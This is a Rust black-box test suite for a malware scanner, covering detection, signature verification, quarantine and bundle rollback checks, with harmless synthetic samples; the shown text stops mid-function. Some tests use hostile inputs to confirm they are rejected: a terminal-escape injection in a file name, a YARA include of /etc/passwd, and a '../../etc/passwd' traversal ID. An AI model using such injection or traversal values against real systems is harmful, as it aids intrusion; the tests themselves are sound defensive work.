//! Black-box tests of the `abyssal-warden` binary.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

const INDICATOR: &[u8] = b"ABYSSAL-WARDEN-SYNTHETIC-TEST-INDICATOR\n";

fn bin() -> Command {
    let mut c = Command::new(env!("CARGO_BIN_EXE_abyssal-warden"));
    // Never send audit anchors to the real system log from tests.
    c.env("ABYSSAL_WARDEN_SYSLOG_SOCKET", "");
    c
}

fn examples() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples")
}

fn test_key() -> PathBuf {
    examples().join("keys/synthetic-test.pub")
}

/// `abyssal-warden scan` with the synthetic test key trusted.
fn trusted_scan() -> Command {
    let mut c = bin();
    c.arg("scan").arg("--trusted-key").arg(test_key());
    c
}

fn example_db() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../examples/signatures/synthetic-test-indicators.json")
}

fn run(cmd: &mut Command) -> Output {
    cmd.output().expect("failed to run binary")
}

#[test]
fn json_scan_with_finding_exits_1() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("indicator.txt"), INDICATOR).unwrap();
    fs::write(dir.path().join("clean.txt"), b"clean").unwrap();

    let out = run(bin()
        .args(["scan", "--trusted-key"])
        .arg(test_key())
        .args(["--format", "json", "--signatures"])
        .arg(example_db())
        .arg(dir.path()));
    assert_eq!(
        out.status.code(),
        Some(1),
        "stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["status"], "completed");
    assert_eq!(v["stats"]["files_scanned"], 2);
    assert_eq!(v["findings"][0]["source"]["rule_id"], "AW-TEST-0001");
    assert_eq!(v["findings"][0]["category"], "test_indicator");
}

#[test]
fn clean_scan_exits_0_and_is_honest_about_coverage() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("clean.txt"), b"clean").unwrap();
    let out = run(trusted_scan()
        .arg("--signatures")
        .arg(example_db())
        .arg(dir.path()));
    assert_eq!(out.status.code(), Some(0));
    let text = String::from_utf8(out.stdout).unwrap();
    assert!(text.contains("Files scanned:        1"));
    assert!(text.contains("not a guarantee"));
}

#[test]
fn scan_without_signatures_warns() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("indicator.txt"), INDICATOR).unwrap();
    let out = run(bin().arg("scan").arg(dir.path()));
    assert_eq!(out.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&out.stderr).contains("NOT evaluated"));
    assert!(String::from_utf8_lossy(&out.stdout).contains("No detectors ran"));
}

#[test]
fn missing_path_exits_3() {
    let dir = tempfile::tempdir().unwrap();
    let out = run(bin().arg("scan").arg(dir.path().join("does-not-exist")));
    assert_eq!(out.status.code(), Some(3));
}

#[test]
fn invalid_database_exits_2_without_scanning() {
    let dir = tempfile::tempdir().unwrap();
    let db = dir.path().join("bad.json");
    fs::write(
        &db,
        br#"{"format":"abyssal-warden.hash-signatures","format_version":9}"#,
    )
    .unwrap();
    let out = run(bin()
        .args(["scan", "--allow-unsigned", "--signatures"])
        .arg(&db)
        .arg(dir.path()));
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("unsupported"));
    assert!(out.stdout.is_empty());
}

#[test]
fn output_file_is_written() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("scan");
    fs::create_dir(&target).unwrap();
    fs::write(target.join("f"), b"f").unwrap();
    let report = dir.path().join("report.json");
    let out = run(bin()
        .args(["scan", "--format", "json", "--output"])
        .arg(&report)
        .arg(&target));
    assert_eq!(out.status.code(), Some(0));
    assert!(out.stdout.is_empty());
    let v: serde_json::Value = serde_json::from_slice(&fs::read(&report).unwrap()).unwrap();
    assert_eq!(v["schema_version"], 1);
}

#[test]
fn hash_prints_sha256sum_format() {
    let dir = tempfile::tempdir().unwrap();
    let f = dir.path().join("indicator.txt");
    fs::write(&f, INDICATOR).unwrap();
    let out = run(bin().arg("hash").arg(&f));
    assert_eq!(out.status.code(), Some(0));
    let line = String::from_utf8(out.stdout).unwrap();
    assert!(line.starts_with("26d11a0d2767bb969011c61c58953c5d89035f8c2ca524efcafe3a9c92461eae  "));
}

#[test]
fn signatures_validate_reports_summary() {
    let out = run(bin()
        .args(["signatures", "validate", "--trusted-key"])
        .arg(test_key())
        .arg(example_db()));
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(text.contains("1 signature(s)"));
    assert!(text.contains("signed by key 70EF691BC71E4DD9"), "{text}");
}

#[test]
fn usage_error_exits_2() {
    let out = run(bin().arg("scan"));
    assert_eq!(out.status.code(), Some(2));
}

#[cfg(target_os = "linux")]
#[test]
fn hostile_file_name_cannot_inject_terminal_escapes() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join(OsStr::from_bytes(b"x\x1b]0;pwned\x07\xff")),
        INDICATOR,
    )
    .unwrap();
    let out = run(trusted_scan()
        .arg("--signatures")
        .arg(example_db())
        .arg(dir.path()));
    assert_eq!(out.status.code(), Some(1));
    assert!(!out.stdout.contains(&0x1b), "raw ESC reached stdout");
    assert!(!out.stdout.contains(&0x07), "raw BEL reached stdout");
    let text = String::from_utf8(out.stdout).unwrap();
    assert!(text.contains("\\u{1b}]0;pwned\\u{7}"));
    assert!(text.contains("not valid Unicode"));
}

fn copy_signed(from: &Path, to_dir: &Path) -> PathBuf {
    let name = from.file_name().unwrap();
    let dest = to_dir.join(name);
    fs::copy(from, &dest).unwrap();
    let mut sig = from.as_os_str().to_owned();
    sig.push(".minisig");
    let mut dest_sig = dest.as_os_str().to_owned();
    dest_sig.push(".minisig");
    fs::copy(PathBuf::from(sig), PathBuf::from(dest_sig)).unwrap();
    dest
}

#[test]
fn unsigned_content_is_refused_unless_allowed() {
    let dir = tempfile::tempdir().unwrap();
    let db = dir.path().join("unsigned.json");
    fs::copy(example_db(), &db).unwrap();
    let target = dir.path().join("t");
    fs::create_dir(&target).unwrap();

    let out = run(trusted_scan().arg("-s").arg(&db).arg(&target));
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("not signed"));

    let out = run(bin()
        .args(["scan", "--allow-unsigned", "--format", "json", "-s"])
        .arg(&db)
        .arg(&target));
    assert_eq!(out.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&out.stderr).contains("has no signature"));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert!(v["detectors"][0]["database"]["signer"].is_null());
    assert!(
        v["warnings"][0]
            .as_str()
            .unwrap()
            .contains("without signature verification")
    );
}

#[test]
fn tampered_database_is_refused_even_with_allow_unsigned() {
    let dir = tempfile::tempdir().unwrap();
    let db = copy_signed(&example_db(), dir.path());
    let text = fs::read_to_string(&db)
        .unwrap()
        .replace("\"info\"", "\"critical\"");
    fs::write(&db, text).unwrap();
    for extra in [&[][..], &["--allow-unsigned"][..]] {
        let out = run(trusted_scan()
            .args(extra)
            .arg("-s")
            .arg(&db)
            .arg(dir.path()));
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("does not verify"));
    }
}

#[test]
fn signature_from_untrusted_key_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let db = copy_signed(&example_db(), dir.path());
    // No --trusted-key: RequireTrusted with an empty key set.
    let out = run(bin().arg("scan").arg("-s").arg(&db).arg(dir.path()));
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("no trusted keys"));
}

#[test]
fn yara_scan_detects_synthetic_marker() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("marker.txt"),
        b"ABYSSAL-WARDEN-YARA-SYNTHETIC-MARKER\n",
    )
    .unwrap();
    fs::write(dir.path().join("clean.txt"), b"clean").unwrap();
    let out = run(trusted_scan()
        .args(["--format", "json", "--yara"])
        .arg(examples().join("rules"))
        .arg("-s")
        .arg(example_db())
        .arg(dir.path()));
    assert_eq!(
        out.status.code(),
        Some(1),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let f = &v["findings"][0];
    assert_eq!(f["source"]["detector"], "yara-x");
    assert_eq!(f["name"], "AbyssalWarden.Test.SyntheticYaraMarker");
    assert_eq!(f["evidence"][0]["kind"], "yara_rule_match");
    assert_eq!(v["detectors"][1]["database"]["signer"], "70EF691BC71E4DD9");
    // Per-file content is flagged as lacking rollback/expiry protection.
    let warnings = v["warnings"].as_array().unwrap();
    assert_eq!(warnings.len(), 1, "{warnings:?}");
    assert!(
        warnings[0]
            .as_str()
            .unwrap()
            .contains("no rollback or expiry protection")
    );
}

#[test]
fn yara_validate_reports_rules_and_rejects_bad_rules() {
    let out = run(bin()
        .args(["yara", "validate", "--trusted-key"])
        .arg(test_key())
        .arg(examples().join("rules/synthetic-test.yar")));
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(String::from_utf8_lossy(&out.stdout).contains("1 YARA rule(s), signed by key"));

    let dir = tempfile::tempdir().unwrap();
    let bad = dir.path().join("bad.yar");
    fs::write(&bad, "include \"/etc/passwd\"\nrule a { condition: true }").unwrap();
    let out = run(bin()
        .args(["yara", "validate", "--allow-unsigned"])
        .arg(&bad));
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("include"));
}

#[cfg(target_os = "linux")]
mod quarantine {
    use super::*;

    const PAYLOAD: &[u8] = b"harmless synthetic payload labelled as malware for testing\n";

    /// An unsigned DB that labels the synthetic payload as malware.
    fn malware_db(dir: &Path) -> PathBuf {
        let db = dir.join("malware-db.json");
        let sha = sha256_of(PAYLOAD);
        fs::write(
            &db,
            format!(
                r#"{{"format":"abyssal-warden.hash-signatures","format_version":1,
                "database":{{"name":"cli-test","version":"1"}},
                "signatures":[{{"id":"AW-CLI-MAL-1","name":"Synthetic.Malware","sha256":"{sha}",
                "category":"malware","severity":"high","rule_version":1}}]}}"#
            ),
        )
        .unwrap();
        db
    }

    fn sha256_of(data: &[u8]) -> String {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("x");
        fs::write(&f, data).unwrap();
        let out = run(bin().arg("hash").arg(&f));
        String::from_utf8(out.stdout).unwrap()[..64].to_owned()
    }

    fn q(store: &Path) -> Command {
        let mut c = bin();
        c.arg("quarantine").arg("--store").arg(store);
        c
    }

    #[test]
    fn scan_quarantine_restore_round_trip() {
        let dir = tempfile::tempdir().unwrap();
        let base = fs::canonicalize(dir.path()).unwrap();
        let target = base.join("target");
        fs::create_dir(&target).unwrap();
        let evil = target.join("payload.bin");
        fs::write(&evil, PAYLOAD).unwrap();
        fs::write(target.join("clean.txt"), b"clean").unwrap();
        let store = base.join("store");

        let out = run(bin()
            .args([
                "scan",
                "--allow-unsigned",
                "--format",
                "json",
                "--quarantine",
                "--quarantine-store",
            ])
            .arg(&store)
            .arg("-s")
            .arg(malware_db(&base))
            .arg(&target));
        assert_eq!(
            out.status.code(),
            Some(1),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        let f = &v["findings"][0];
        assert_eq!(f["remediation_status"], "quarantined", "{f}");
        let detail = f["remediation_detail"].as_str().unwrap();
        let id = detail.trim_start_matches("quarantine ID ").to_owned();
        assert!(!evil.exists(), "file should be quarantined");

        let out = run(q(&store).arg("list"));
        assert!(String::from_utf8_lossy(&out.stdout).contains(&id));

        let out = run(q(&store).args(["restore", &id]));
        assert_eq!(out.status.code(), Some(2), "restore must require --yes");
        assert!(!evil.exists());

        let out = run(q(&store).args(["restore", &id, "--yes"]));
        assert_eq!(
            out.status.code(),
            Some(0),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(fs::read(&evil).unwrap(), PAYLOAD);

        // quarantine, restore, allow: three audit entries.
        let out = run(q(&store).arg("verify-log"));
        assert_eq!(out.status.code(), Some(0));
        let text = String::from_utf8_lossy(&out.stdout).into_owned();
        assert!(text.contains("3 entries"), "{text}");
        assert!(text.contains("head: seq=3 hash="), "{text}");

        // The restored file is allow-listed: a new scan reports it as
        // allowed, exits 0, and does not quarantine it again.
        let out = run(q(&store).args(["allowlist", "list"]));
        let sha = &String::from_utf8_lossy(&out.stdout)[..64].to_owned();
        let out = run(bin()
            .args([
                "scan",
                "--allow-unsigned",
                "--format",
                "json",
                "--quarantine",
                "--quarantine-store",
            ])
            .arg(&store)
            .arg("-s")
            .arg(malware_db(&base))
            .arg(&target));
        assert_eq!(
            out.status.code(),
            Some(0),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        assert_eq!(v["findings"][0]["remediation_status"], "allowed");
        assert!(
            evil.exists(),
            "an allow-listed file must not be quarantined again"
        );

        // Removing it from the allow-list makes it a finding again.
        let out = run(q(&store).args(["allowlist", "remove", sha]));
        assert_eq!(out.status.code(), Some(0));
        let out = run(bin()
            .args(["scan", "--allow-unsigned", "--format", "json", "-s"])
            .arg(malware_db(&base))
            .arg("--quarantine-store")
            .arg(&store)
            .arg(&target));
        assert_eq!(out.status.code(), Some(1));
    }

    #[test]
    fn audit_anchors_go_to_the_configured_syslog_socket() {
        use std::os::unix::net::UnixDatagram;
        let dir = tempfile::tempdir().unwrap();
        let base = fs::canonicalize(dir.path()).unwrap();
        let sock_path = base.join("log.sock");
        let sock = UnixDatagram::bind(&sock_path).unwrap();
        sock.set_read_timeout(Some(std::time::Duration::from_secs(5)))
            .unwrap();
        let f = base.join("x.bin");
        fs::write(&f, PAYLOAD).unwrap();
        let out = run(q(&base.join("store"))
            .env("ABYSSAL_WARDEN_SYSLOG_SOCKET", &sock_path)
            .arg("add")
            .arg(&f));
        assert_eq!(
            out.status.code(),
            Some(0),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let mut buf = [0u8; 512];
        let n = sock.recv(&mut buf).unwrap();
        let msg = String::from_utf8_lossy(&buf[..n]).into_owned();
        assert!(msg.contains("audit seq=1 hash="), "{msg}");
        assert!(msg.ends_with("action=quarantine outcome=ok"), "{msg}");
        assert!(!msg.contains("x.bin"), "paths are never sent to syslog");

        // An unreachable log is a warning, not a failure.
        let g = base.join("y.bin");
        fs::write(&g, b"other").unwrap();
        let out = run(q(&base.join("store"))
            .env("ABYSSAL_WARDEN_SYSLOG_SOCKET", base.join("nope.sock"))
            .arg("add")
            .arg(&g));
        assert_eq!(out.status.code(), Some(0));
        assert!(String::from_utf8_lossy(&out.stderr).contains("no external anchor"));
    }

    #[test]
    fn only_confirmed_malware_is_quarantined() {
        let dir = tempfile::tempdir().unwrap();
        let base = fs::canonicalize(dir.path()).unwrap();
        let target = base.join("target");
        fs::create_dir(&target).unwrap();
        // Test indicator (hash DB) and a YARA match: neither is eligible.
        fs::write(target.join("indicator.txt"), INDICATOR).unwrap();
        fs::write(
            target.join("marker.txt"),
            b"ABYSSAL-WARDEN-YARA-SYNTHETIC-MARKER",
        )
        .unwrap();
        let out = run(trusted_scan()
            .args(["--format", "json", "--quarantine", "--quarantine-store"])
            .arg(base.join("store"))
            .arg("-s")
            .arg(example_db())
            .arg("--yara")
            .arg(examples().join("rules"))
            .arg(&target));
        assert_eq!(
            out.status.code(),
            Some(1),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        let findings = v["findings"].as_array().unwrap();
        assert_eq!(findings.len(), 2);
        for f in findings {
            assert_eq!(f["remediation_status"], "not_eligible", "{f}");
        }
        assert!(target.join("indicator.txt").exists());
        assert!(target.join("marker.txt").exists());
        assert!(
            !base.join("store").exists(),
            "store is not even created when nothing is eligible"
        );
    }

    #[test]
    fn manual_add_and_delete() {
        let dir = tempfile::tempdir().unwrap();
        let base = fs::canonicalize(dir.path()).unwrap();
        let f = base.join("suspicious.bin");
        fs::write(&f, PAYLOAD).unwrap();
        let store = base.join("store");

        let out = run(q(&store)
            .arg("add")
            .arg(&f)
            .args(["--sha256", &"0".repeat(64)]));
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("changed"));
        assert!(f.exists());

        let out = run(q(&store).arg("add").arg(&f).args(["--note", "manual test"]));
        assert_eq!(
            out.status.code(),
            Some(0),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let text = String::from_utf8(out.stdout).unwrap();
        let id = text.split_whitespace().last().unwrap().to_owned();
        assert!(!f.exists());

        assert_eq!(run(q(&store).args(["delete", &id])).status.code(), Some(2));
        assert_eq!(
            run(q(&store).args(["delete", &id, "--yes"])).status.code(),
            Some(0)
        );
        let out = run(q(&store).args(["show", &id]));
        let rec: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        assert_eq!(rec["state"], "deleted");
        assert_eq!(rec["reason"]["note"], "manual test");

        let out = run(q(&store).args(["show", "../../etc/passwd"]));
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("invalid quarantine ID"));
    }

    #[test]
    fn malware_inside_an_archive_is_not_auto_quarantined() {
        let dir = tempfile::tempdir().unwrap();
        let base = fs::canonicalize(dir.path()).unwrap();
        let target = base.join("target");
        fs::create_dir(&target).unwrap();
        let archive = target.join("family-photos.zip");
        fs::write(&archive, zip_of(&[("payload.bin", PAYLOAD)])).unwrap();
        let out = run(bin()
            .args([
                "scan",
                "--allow-unsigned",
                "--format",
                "json",
                "--quarantine",
                "--quarantine-store",
            ])
            .arg(base.join("store"))
            .arg("-s")
            .arg(malware_db(&base))
            .arg(&target));
        assert_eq!(
            out.status.code(),
            Some(1),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        let f = &v["findings"][0];
        assert_eq!(f["target"]["type"], "archive_member");
        assert_eq!(f["remediation_status"], "not_eligible");
        assert!(
            f["remediation_detail"]
                .as_str()
                .unwrap()
                .contains("inside an archive")
        );
        assert!(archive.exists(), "the archive must be left alone");
    }

    #[test]
    fn protected_paths_are_refused() {
        let dir = tempfile::tempdir().unwrap();
        let out = run(q(&dir.path().join("store")).args(["add", "/etc/hostname"]));
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("protected"));
    }
}

#[test]
fn scan_timeout_flag_is_validated_and_recorded() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("f"), b"f").unwrap();
    let out = run(bin().args(["scan", "--scan-timeout", "0"]).arg(dir.path()));
    assert_eq!(out.status.code(), Some(2));
    let out = run(bin()
        .args(["scan", "--format", "json", "--scan-timeout", "600"])
        .arg(dir.path()));
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["settings"]["scan_timeout_ms"], 600_000);
    assert_eq!(v["status"], "completed");
}

fn zip_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
    use std::io::Write;
    let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    for (name, data) in entries {
        w.start_file(*name, zip::write::SimpleFileOptions::default())
            .unwrap();
        w.write_all(data).unwrap();
    }
    w.finish().unwrap().into_inner()
}

#[test]
fn archive_members_are_scanned_and_shown() {
    let dir = tempfile::tempdir().unwrap();
    let inner = zip_of(&[("drop/indicator.txt", INDICATOR)]);
    fs::write(
        dir.path().join("mail.zip"),
        zip_of(&[("attachment.zip", &inner)]),
    )
    .unwrap();

    let out = run(trusted_scan().arg("-s").arg(example_db()).arg(dir.path()));
    assert_eq!(out.status.code(), Some(1));
    let text = String::from_utf8(out.stdout).unwrap();
    assert!(
        text.contains("mail.zip > attachment.zip > drop/indicator.txt"),
        "{text}"
    );
    assert!(text.contains("Archive members:      2"), "{text}");

    let out = run(trusted_scan()
        .args(["--no-archives", "--format", "json", "-s"])
        .arg(example_db())
        .arg(dir.path()));
    assert_eq!(out.status.code(), Some(0));
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["settings"]["archives"]["enabled"], false);
    assert!(v["findings"].as_array().unwrap().is_empty());
}

#[test]
fn archive_flags_are_validated() {
    let dir = tempfile::tempdir().unwrap();
    let out = run(bin()
        .args(["scan", "--archive-max-depth", "0"])
        .arg(dir.path()));
    assert_eq!(out.status.code(), Some(2));
}

mod bundles {
    use super::*;
    use std::io::Cursor;

    struct Key {
        pk: minisign::PublicKey,
        sk: minisign::SecretKey,
    }

    impl Key {
        fn new() -> Self {
            let kp = minisign::KeyPair::generate_unencrypted_keypair().unwrap();
            Self {
                pk: kp.pk,
                sk: kp.sk,
            }
        }
        fn id(&self) -> String {
            // The .pub box's comment carries the key ID as minisign prints it.
            let text = self.pk.to_box().unwrap().to_string();
            text.lines()
                .next()
                .unwrap()
                .rsplit(' ')
                .next()
                .unwrap()
                .to_owned()
        }
        /// Write a keyring holding this key to `path`; `extra` adds fields.
        fn keyring(&self, path: &Path, extra: &str) -> PathBuf {
            fs::write(
                path,
                format!(
                    r#"{{"format":"abyssal-warden.keyring","format_version":1,"keys":[{{"id":"{}","public_key":"{}"{extra}}}]}}"#,
                    self.id(),
                    self.pk.to_base64()
                ),
            )
            .unwrap();
            path.to_owned()
        }
        /// Sign `file` into `FILE.minisig.N` (an additional signature).
        fn sign_as(&self, file: &Path, n: usize) {
            let data = fs::read(file).unwrap();
            let sig = minisign::sign(Some(&self.pk), &self.sk, Cursor::new(data), None, None)
                .unwrap()
                .to_string();
            let mut p = file.as_os_str().to_owned();
            p.push(format!(".minisig.{n}"));
            fs::write(PathBuf::from(p), sig).unwrap();
        }

        fn entry(&self) -> String {
            format!(
                r#"{{"id":"{}","public_key":"{}"}}"#,
                self.id(),
                self.pk.to_base64()
            )
        }

        fn sign(&self, file: &Path) {
            let data = fs::read(file).unwrap();
            let sig = minisign::sign(Some(&self.pk), &self.sk, Cursor::new(data), None, None)
                .unwrap()
                .to_string();
            let mut p = file.as_os_str().to_owned();
            p.push(".minisig");
            fs::write(PathBuf::from(p), sig).unwrap();
        }
    }

    /// A bundle holding the example database and rule, built with the real
    /// `content manifest` command and signed with `key`.
    fn make_bundle(dir: &Path, key: &Key, sequence: u64, extra_rule: &str) -> PathBuf {
        fs::create_dir_all(dir.join("signatures")).unwrap();
        fs::create_dir_all(dir.join("rules")).unwrap();
        fs::copy(example_db(), dir.join("signatures/db.json")).unwrap();
        let rule = fs::read_to_string(examples().join("rules/synthetic-test.yar")).unwrap();
        fs::write(dir.join("rules/r.yar"), format!("{rule}\n{extra_rule}")).unwrap();
        let out = run(bin()
            .args([
                "content",
                "manifest",
                "--name",
                "cli-test",
                "--force",
                "--sequence",
            ])
            .arg(sequence.to_string())
            .arg(dir));
        assert_eq!(
            out.status.code(),
            Some(0),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        key.sign(&dir.join("manifest.json"));
        dir.to_owned()
    }

    fn scan_bundle(bundle: &Path, keyring: &Path, state: &Path, extra: &[&str]) -> Output {
        let target = bundle.parent().unwrap().join("target");
        fs::create_dir_all(&target).unwrap();
        fs::write(
            target.join("marker.txt"),
            b"ABYSSAL-WARDEN-YARA-SYNTHETIC-MARKER\n",
        )
        .unwrap();
        run(bin()
            .args(["scan", "--format", "json", "--keyring"])
            .arg(keyring)
            .arg("--content-state")
            .arg(state)
            .arg("--content")
            .arg(bundle)
            .args(extra)
            .arg(&target))
    }

    #[test]
    fn bundle_scan_records_sequence_and_refuses_rollback() {
        let dir = tempfile::tempdir().unwrap();
        let key = Key::new();
        let ring = key.keyring(&dir.path().join("keyring.json"), "");
        let state = dir.path().join("state/content-state.json");

        let v2 = make_bundle(&dir.path().join("v2"), &key, 2, "");
        let out = scan_bundle(&v2, &ring, &state, &[]);
        assert_eq!(
            out.status.code(),
            Some(1),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        assert_eq!(v["content_bundles"][0]["name"], "cli-test");
        assert_eq!(v["content_bundles"][0]["sequence"], 2);
        assert_eq!(v["content_bundles"][0]["signers"][0], key.id());
        assert!(
            v["warnings"].as_array().unwrap().is_empty(),
            "{}",
            v["warnings"]
        );
        assert_eq!(v["findings"][0]["source"]["detector"], "yara-x");

        // An older release is refused, even though validly signed.
        let v1 = make_bundle(&dir.path().join("v1"), &key, 1, "");
        let out = scan_bundle(&v1, &ring, &state, &[]);
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("rollback refused"));

        // A different release claiming the same sequence is refused.
        let other = make_bundle(&dir.path().join("v2b"), &key, 2, "// changed\n");
        let out = scan_bundle(&other, &ring, &state, &[]);
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("same sequence"));

        // The same release again, and a newer one, are fine.
        assert_eq!(scan_bundle(&v2, &ring, &state, &[]).status.code(), Some(1));
        let v3 = make_bundle(&dir.path().join("v3"), &key, 3, "");
        assert_eq!(scan_bundle(&v3, &ring, &state, &[]).status.code(), Some(1));

        // `content verify` applies the rollback check too.
        let out = run(bin()
            .args(["content", "verify", "--keyring"])
            .arg(&ring)
            .arg("--content-state")
            .arg(&state)
            .arg(&v1));
        assert_eq!(out.status.code(), Some(2));
    }

    #[test]
    fn verify_records_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let key = Key::new();
        let ring = key.keyring(&dir.path().join("keyring.json"), "");
        let state = dir.path().join("state.json");
        let v5 = make_bundle(&dir.path().join("v5"), &key, 5, "");
        let out = run(bin()
            .args(["content", "verify", "--keyring"])
            .arg(&ring)
            .arg("--content-state")
            .arg(&state)
            .arg(&v5));
        assert_eq!(out.status.code(), Some(0));
        // Had verify recorded sequence 5, this older bundle would be refused.
        let v4 = make_bundle(&dir.path().join("v4"), &key, 4, "");
        assert_eq!(scan_bundle(&v4, &ring, &state, &[]).status.code(), Some(1));
    }

    #[test]
    fn expired_bundles_need_explicit_permission() {
        let dir = tempfile::tempdir().unwrap();
        let key = Key::new();
        let ring = key.keyring(&dir.path().join("keyring.json"), "");
        let state = dir.path().join("state.json");
        let b = make_bundle(&dir.path().join("b"), &key, 1, "");
        // Rewrite the manifest to have expired long ago, and re-sign it.
        let m = b.join("manifest.json");
        let mut json: serde_json::Value = serde_json::from_slice(&fs::read(&m).unwrap()).unwrap();
        json["issued"] = "2020-01-01T00:00:00Z".into();
        json["expires"] = "2020-02-01T00:00:00Z".into();
        fs::write(&m, serde_json::to_vec_pretty(&json).unwrap()).unwrap();
        key.sign(&m);

        let out = scan_bundle(&b, &ring, &state, &[]);
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("expired"));

        let out = scan_bundle(&b, &ring, &state, &["--allow-expired"]);
        assert_eq!(
            out.status.code(),
            Some(1),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
        assert_eq!(v["content_bundles"][0]["expired"], true);
        assert!(
            v["warnings"][0]
                .as_str()
                .unwrap()
                .contains("--allow-expired")
        );
    }

    #[test]
    fn revoked_key_and_tampered_file_are_refused() {
        let dir = tempfile::tempdir().unwrap();
        let key = Key::new();
        let state = dir.path().join("state.json");
        let b = make_bundle(&dir.path().join("b"), &key, 1, "");

        let revoked = key.keyring(&dir.path().join("revoked.json"), r#","revoked":true"#);
        let out = scan_bundle(&b, &revoked, &state, &[]);
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("revoked"));

        let ring = key.keyring(&dir.path().join("keyring.json"), "");
        fs::write(b.join("rules/r.yar"), "rule tampered { condition: true }").unwrap();
        let out = scan_bundle(&b, &ring, &state, &[]);
        assert_eq!(out.status.code(), Some(2));
        // The tampered file differs in size, which is checked before the hash.
        let err = String::from_utf8_lossy(&out.stderr).into_owned();
        assert!(
            err.contains("rules/r.yar") && err.contains("the manifest says"),
            "{err}"
        );
    }

    #[test]
    fn manifest_tool_refuses_bad_content_and_overwrites() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().join("b");
        fs::create_dir_all(&d).unwrap();
        let manifest = |extra: &[&str]| {
            let mut c = bin();
            c.args(["content", "manifest", "--sequence", "1"])
                .args(extra)
                .arg(&d);
            run(&mut c)
        };
        fs::write(d.join("broken.json"), b"{\"not\":\"a database\"}").unwrap();
        assert_eq!(manifest(&["--name", "x"]).status.code(), Some(2));
        fs::remove_file(d.join("broken.json")).unwrap();

        fs::write(d.join("notes.txt"), b"hello").unwrap();
        let out = manifest(&["--name", "x"]);
        assert_eq!(out.status.code(), Some(2));
        assert!(String::from_utf8_lossy(&out.stderr).contains("unknown content file"));
        fs::remove_file(d.join("notes.txt")).unwrap();

        fs::copy(example_db(), d.join("db.json")).unwrap();
        assert_eq!(manifest(&["--name", "x"]).status.code(), Some(0));
        let out = manifest(&["--name", "x"]);
        assert_eq!(
            out.status.code(),
            Some(2),
            "must not overwrite without --force"
        );
        assert_eq!(
            manifest(&["--name", "bad name", "--force"]).status.code(),
            Some(2)
        );
    }

    /// A keyring trusting `keys`, with extra top-level fields.
    fn keyring_of(path: &Path, keys: &[&Key], extra: &str) -> PathBuf {
        let entries: Vec<String> = keys.iter().map(|k| k.entry()).collect();
        fs::write(
            path,
            format!(
